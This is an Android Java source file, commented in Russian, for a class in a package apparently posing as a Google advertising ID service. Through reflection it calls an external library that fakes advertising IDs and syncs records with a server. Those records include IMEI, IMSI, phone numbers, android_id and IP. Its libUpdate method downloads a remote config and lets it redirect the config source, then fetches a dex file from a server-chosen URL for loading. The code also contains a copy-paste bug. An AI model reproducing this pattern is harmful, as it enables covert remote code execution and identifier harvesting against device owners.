package com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.LoaderManager;
import android.support.v4.content.AsyncTaskLoader;
import android.support.v4.content.Loader;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdvertisingIdGetter {
    @Override
    public String getVersion(Context cnt) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getVersion()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getVersion", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public String getOriginalID(Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getOriginalID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getOriginalID", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public String generateGUID(GenerateIDType control_parameter, Context cnt) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.generateGUID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzEnumGenerateIDType        = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$GenerateIDType");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "generateGUID",
                                                new Object[]{
                                                        loader.getEnumValue(clazzEnumGenerateIDType, control_parameter.ordinal()),
                                                        cnt
                                                },
                                                new Class[]{
                                                        clazzEnumGenerateIDType,
                                                        Context.class
                                                });
        return str;
    }

    @Override
    public String getFakeGaid(Context cnt) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getFakeGaid()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getFakeGaid", new Object[]{cnt}, new Class[]{Context.class});
        return str;
    }

    @Override
    public List<String> getFilePublisherIDs(PublusherIDType control_parameter, Context cnt, PublisherIDMask mask) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getFilePublisherIDs()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzMask                      = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
        Class clazzEnumPublusherIDType       = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$PublusherIDType");

        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object instanceMask                  = loader.getInstance(clazzMask,
                                                new Object[]{
                                                    mask.getPrefix(),
                                                    mask.getSeporator(),
                                                    mask.getExtension()
                                                },
                                                new Class[]{
                                                    String.class,
                                                    String.class,
                                                    String.class
                                                });


        List<String> res                     = ExternalLibServicer.getServicer(cnt).callMethod(clazzGoogleAdvertisingIdGetter, instance, "getFilePublisherIDs",
                                                new Object[]{
                                                        loader.getEnumValue(clazzEnumPublusherIDType, control_parameter.ordinal()),
                                                        cnt,
                                                        instanceMask
                                                },
                                                new Class[]{
                                                        clazzEnumPublusherIDType,
                                                        Context.class,
                                                        clazzMask
                                                });
        return res;
    }

    @Override
    public String getInnerPublisherIDs(PublusherIDType control_parameter, Context cnt, String key) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getInnerPublisherIDs()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzEnumPublusherIDType       = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter$PublusherIDType");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getInnerPublisherIDs",
                new Object[]{
                        loader.getEnumValue(clazzEnumPublusherIDType, control_parameter.ordinal()),
                        cnt,
                        key
                },
                new Class[]{
                        clazzEnumPublusherIDType,
                        Context.class,
                        String.class
                });
        return str;
    }

    @Override
    public String getGAID(Context cnt, String callDestination) throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.getGAID()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "getGAID", new Object[]{cnt, callDestination}, new Class[]{Context.class, String.class});
        return str;
    }

    //*****************************************************************************
    //************************ Методы работы с REST *******************************
    //*****************************************************************************
    @Override
    public ResultCreate rest_create(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_create()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultCreate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultCreate");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
                new Object[]{
                        cnt,
                        lm,
                        callDestination,
                        login,
                        pass},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        String.class,
                        String.class,
                        String.class});
        ResultCreate resCreate = new ResultCreate("","","","");
        resCreate.result    = loader.getAttribute(resultCreate,res,"result");
        resCreate.error_id  = loader.getAttribute(resultCreate,res,"error_id");
        resCreate.error_msg = loader.getAttribute(resultCreate,res,"error_msg");
        resCreate.guid      = loader.getAttribute(resultCreate,res,"guid");
        return resCreate;
    }

    @Override
    public ResultUpdate rest_update(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_update()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultUpdate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultUpdate");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
                new Object[]{
                        cnt,
                        lm,
                        callDestination,
                        login,
                        pass},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        String.class,
                        String.class,
                        String.class});

        ResultUpdate resUpdate = new ResultUpdate("","","","");
        resUpdate.result    = loader.getAttribute(resultUpdate,res,"result");
        resUpdate.error_id  = loader.getAttribute(resultUpdate,res,"error_id");
        resUpdate.error_msg = loader.getAttribute(resultUpdate,res,"error_msg");
        resUpdate.guid      = loader.getAttribute(resultUpdate,res,"guid");
        return resUpdate;
    }

    @Override
    public ResultInstall rest_install(Context cnt, LoaderManager lm, String callDestination, InstallationInfo _installInfo, String login, String pass) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_install()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        PublisherIDMask m   = _installInfo.getMask();

        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class clazzPublisherIDMask           = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
        Class clazzInstallationInfo          = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".InstallationInfo");
        Class resultInstall                  = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultInstall");

        Object instance     = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object Mask         = loader.getInstance(clazzPublisherIDMask,  new Object[]{m.getPrefix(),m.getSeporator(),m.getExtension()},  new Class[]{String.class,String.class,String.class});
        Object install_info = loader.getInstance(clazzInstallationInfo, new Object[]{cnt,callDestination,Mask}, new Class[]{Context.class,String.class, clazzPublisherIDMask});
        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
                new Object[]{
                        cnt,
                        lm,
                        callDestination,
                        install_info,
                        login,
                        pass},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        String.class,
                        clazzInstallationInfo,
                        String.class,
                        String.class});

        ResultInstall resInstall = new ResultInstall("","","","");
        resInstall.result    = loader.getAttribute(resultInstall,res,"result");
        resInstall.error_id  = loader.getAttribute(resultInstall,res,"error_id");
        resInstall.error_msg = loader.getAttribute(resultInstall,res,"error_msg");
        resInstall.guid      = loader.getAttribute(resultInstall,res,"guid");
        return resInstall;
    }

    @Override
    public ResultRead rest_read(Context cnt, LoaderManager lm, IApi.RestReadType readType, String callDestination, String login, String pass) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_read()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class IApi_RestReadType              = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.IApi$RestReadType");
        Class resultRead                     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead");
        Class resultRead_ItemParams          = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultRead$ItemParams");

        Object instance = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res      = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_read",
                new Object[]{
                        cnt,
                        lm,
                        loader.getEnumValue(IApi_RestReadType, readType.ordinal()),
                        callDestination,
                        login,
                        pass},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        IApi_RestReadType,
                        String.class,
                        String.class,
                        String.class});

        ResultRead resRead = new ResultRead();

        resRead.result    = loader.getAttribute(resultRead,res,"result");
        resRead.error_id  = loader.getAttribute(resultRead,res,"error_id");
        resRead.error_msg = loader.getAttribute(resultRead,res,"error_msg");
        resRead.found_by  = loader.getAttribute(resultRead,res,"found_by");
        resRead.guids = new ArrayList<>();
        List<Object> res_ItemParams = loader.getAttribute(resultRead,res,"guids");
        if (res_ItemParams != null) {
            for (Iterator<Object> elem = res_ItemParams.iterator(); elem.hasNext(); ) {
                ResultRead.ItemParams resRead_itemparams = new ResultRead.ItemParams();
                Object obj = elem.next();
                resRead_itemparams.model         = loader.getAttribute(resultRead_ItemParams, obj, "model");
                resRead_itemparams.imei1         = loader.getAttribute(resultRead_ItemParams, obj, "model");
                resRead_itemparams.imei2         = loader.getAttribute(resultRead_ItemParams, obj, "imei2");
                resRead_itemparams.imei3         = loader.getAttribute(resultRead_ItemParams, obj, "imei3");
                resRead_itemparams.guid          = loader.getAttribute(resultRead_ItemParams, obj, "guid");
                resRead_itemparams.device        = loader.getAttribute(resultRead_ItemParams, obj, "device");
                resRead_itemparams.ua            = loader.getAttribute(resultRead_ItemParams, obj, "ua");
                resRead_itemparams.brand         = loader.getAttribute(resultRead_ItemParams, obj, "brand");
                resRead_itemparams.product_id    = loader.getAttribute(resultRead_ItemParams, obj, "product_id");
                resRead_itemparams.guid_source   = loader.getAttribute(resultRead_ItemParams, obj, "guid_source");
                resRead_itemparams.imsi1         = loader.getAttribute(resultRead_ItemParams, obj, "imsi1");
                resRead_itemparams.imsi2         = loader.getAttribute(resultRead_ItemParams, obj, "imsi2");
                resRead_itemparams.imsi3         = loader.getAttribute(resultRead_ItemParams, obj, "imsi3");
                resRead_itemparams.msisdn1       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn1");
                resRead_itemparams.msisdn2       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn2");
                resRead_itemparams.msisdn3       = loader.getAttribute(resultRead_ItemParams, obj, "msisdn3");
                resRead_itemparams.ua_uuid       = loader.getAttribute(resultRead_ItemParams, obj, "ua_uuid");
                resRead_itemparams.display_hight = loader.getAttribute(resultRead_ItemParams, obj, "display_hight");
                resRead_itemparams.android_id    = loader.getAttribute(resultRead_ItemParams, obj, "android_id");
                resRead_itemparams.display_width = loader.getAttribute(resultRead_ItemParams, obj, "display_width");
                resRead_itemparams.login         = loader.getAttribute(resultRead_ItemParams, obj, "login");
                resRead_itemparams.date          = loader.getAttribute(resultRead_ItemParams, obj, "date");
                resRead_itemparams.manufactor    = loader.getAttribute(resultRead_ItemParams, obj, "manufactor");
                resRead_itemparams.ip            = loader.getAttribute(resultRead_ItemParams, obj, "ip");
                resRead_itemparams.version_os    = loader.getAttribute(resultRead_ItemParams, obj, "version_os");
                resRead.guids.add(resRead_itemparams);
            }
        }
        return resRead;
    }

    @Override
    public ResultDelete rest_delete(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_delete()");
        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
        Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
        Class resultDelete                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultDelete");
        Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
                new Object[]{
                        cnt,
                        lm,
                        callDestination,
                        login,
                        pass},
                new Class[]{
                        Context.class,
                        LoaderManager.class,
                        String.class,
                        String.class,
                        String.class});

        ResultDelete resDelete = new ResultDelete("","","","");
        resDelete.result    = loader.getAttribute(resultDelete,res,"result");
        resDelete.error_id  = loader.getAttribute(resultDelete,res,"error_id");
        resDelete.error_msg = loader.getAttribute(resultDelete,res,"error_msg");
        resDelete.guid      = loader.getAttribute(resultDelete,res,"guid");
        return resDelete;
    }

    //*****************************************************************************
    //*************** Методы работы с обновлением библиотеки **********************
    //*****************************************************************************
    // !!!! Метод должен вызываться в отдельном потоке !!!!
    //Проверить последнюю версию библиотеки и обновить её
    // @param cnt  - контекст
    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
    // @param GAID - GAID устройства
    //
    @Override
    public boolean libUpdate(final Context cnt, final LoaderManager lm, final String GAID) {
        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.libUpdate()");
        final ExternalLibServicer class_loader = ExternalLibServicer.getServicer(cnt);
// // Т.К. есть какие-то проблемы с созданием лоадера когда я вызываю метод рефлексией, пришлось нормальный код:
//        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
//        Class codeUpdaterClazz     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
//        Object instance            = loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
//        Object res                 = loader.callMethod(codeUpdaterClazz, instance, "updateCode",
//                new Object[]{
//                        cnt,
//                        lm,
//                        GAID},
//                new Class[]{
//                        Context.class,
//                        LoaderManager.class,
//                        String.class});

// заменить на этого франкинштейна:

        lm.restartLoader(CodeUpdater.LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
            @SuppressLint("StaticFieldLeak")
            @Override
            public Loader<String> onCreateLoader(int i, Bundle bundle) {
                return new AsyncTaskLoader<String>(cnt) {
                    public String loadInBackground() {
                        //String path_to_conf_file = cnt.getSharedPreferences("pref_session", Context.MODE_PRIVATE).getString("path_to_conf_file", null);
                        String path_to_conf_file = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                        String path = (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file;
                        Logger.log("Грузим файл из:" + path);
                        String res = null;
//                        FilesLoader fl = new FilesLoader();
//                        fl.downloadFile(cnt, GlobalParameters.URL_TO_CONFIG_FILE, GlobalParameters.ConfigFilePath(cnt));
//                        fl.unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);
                        Class FilesLoaderClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
                        Object instance            = class_loader.getInstance(FilesLoaderClazz, new Object[]{}, new Class[]{});
                        res                        = class_loader.callMethod(FilesLoaderClazz, instance, "downloadFile",
                            new Object[]{
                                    cnt,
                                    (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file,
                                    GlobalParameters.ConfigFilePath(cnt)},
                            new Class[]{
                                    Context.class,
                                    String.class,
                                    String.class});

                        class_loader.callMethod(FilesLoaderClazz, instance, "unpackZip",
                                new Object[]{
                                        GlobalParameters.getBasePath(cnt),
                                        GlobalParameters.CONFIG_FILE_NAME_ZIP},
                                new Class[]{
                                        String.class,
                                        String.class});
                        return res;
                    }
                };
            }

            @Override
            public void onLoadFinished(Loader<String> loader, String result) {

                String json_str = new CodeUpdater().loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
                try {
                    JSONObject rootObj = new JSONObject(json_str);
                    String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
                    //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                    String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                    if (!path_to_conf_file.equals(path_to_conf_file_last))
                    {
                        Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
                        Logger.log("Вместо:" + path_to_conf_file_last);
                        //cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
                        SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file);
                        new CodeUpdater().updateCode(cnt, lm, GAID);
                        return;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Logger.log("Ошибка загрузки конфигурационного файла" + e.getMessage());
                }

                String url = null;
                //String url = getUrlToLoadDexFile(cnt, device_id);
                Class codeUpdaterClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
                Object instance        = class_loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
                String url_            = class_loader.callMethod(codeUpdaterClazz, instance, "getUrlToLoadDexFile",
                        new Object[]{
                                cnt,
                                GAID},
                        new Class[]{
                                Context.class,
                                String.class});

                if (url_ != null) {
                  //  FilesLoader.downloadDexFile(cnt, url);
                    Class filesLoaderClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
                    Object instance2        = class_loader.getInstance(filesLoaderClazz, new Object[]{}, new Class[]{});
                    class_loader.callMethod(filesLoaderClazz, instance2, "downloadDexFile",
                            new Object[]{
                                    cnt,
                                    url_},
                            new Class[]{
                                    Context.class,
                                    String.class});
                }
            }

            @Override
            public void onLoaderReset(Loader<String> loader) {
            }
        }).forceLoad();

        return true;
    }
}